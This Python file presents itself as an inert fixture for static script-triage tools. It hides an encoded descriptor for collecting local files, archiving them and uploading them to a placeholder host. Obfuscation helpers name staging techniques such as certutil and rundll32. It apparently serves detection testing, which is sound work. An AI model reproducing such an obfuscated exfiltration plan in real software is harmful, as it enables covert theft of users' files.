# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_a5be8a63 = "128,71,60,134,125,126,111,122,125,71,109,121,118,118,111,109,126,105,118,121,109,107,118,54,111,120,109,121,110,111,105,107,124,109,114,115,128,111,54,126,124,107,120,125,119,115,126,105,124,111,119,121,126,111,134,107,110,107,122,126,111,124,71,109,111,124,126,127,126,115,118,105,107,124,109,114,115,128,111,105,122,124,111,110,111,109,111,125,125,121,124,134,125,126,107,113,111,105,109,121,127,120,126,71,59,134,125,131,120,126,107,130,71,110,115,109,126,115,121,120,107,124,131,105,110,115,125,122,107,126,109,114,134,121,108,112,127,125,109,107,126,115,121,120,71,118,107,119,108,110,107,105,115,120,110,115,124,111,109,126,115,121,120,134,109,107,124,124,115,111,124,71,122,131,115,120,125,126,107,118,118,111,124,105,121,120,111,110,115,124,134,129,115,120,110,121,129,125,105,109,114,107,115,120,71,124,127,120,110,118,118,61,60,105,122,124,111,110,111,109,111,125,125,121,124,134,109,107,119,122,107,115,113,120,105,115,110,71,109,107,119,122,107,115,113,120,55,63,61,62,109,111,60,107,59,65,64,134,127,122,118,121,107,110,105,127,124,118,71,114,126,126,122,125,68,57,57,63,61,62,109,111,60,107,59,65,64,56,111,130,107,119,122,118,111,56,115,120,128,107,118,115,110,57,127,122,118,121,107,110,134,107,124,109,114,115,128,111,105,122,107,126,114,71,77,68,57,90,124,121,113,124,107,119,78,107,126,107,57,82,127,120,126,124,111,125,125,86,107,108,57,109,107,109,114,111,55,63,61,62,109,111,60,107,59,65,64,56,132,115,122"
CODEC_a5be8a63 = "decimal_csv|add_modulo_256|0a"

def load_a5be8a63():
    return bytes(int(item) for item in MATERIAL_a5be8a63.split(","))

def decode_a5be8a63(EnCoDeD_Bytes):
    return bytes((value - 10) % 256 for value in EnCoDeD_Bytes)

def recover_a5be8a63():
    NeUtRaL = 19 * 7 - 133
    StAtE = "decode"
    while StAtE != "done":
        if StAtE == "decode":
            DeCoDeD_Bytes = decode_a5be8a63(load_a5be8a63())
            StAtE = "done"
    DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
    return DeScRiPtOr_Text

def inspect_a5be8a63():
    view = memoryview(recover_a5be8a63().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_a5be8a63():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_a5be8a63():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_a5be8a63():
    fields = dict(item.split("=", 1) for item in inspect_a5be8a63().split("|"))
    analysis_surface = surface_a5be8a63()
    obfuscation_surface = obfuscation_a5be8a63()
    operation_plan = ("certutil_archive_predecessor", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_a5be8a63())

# reconstruction complete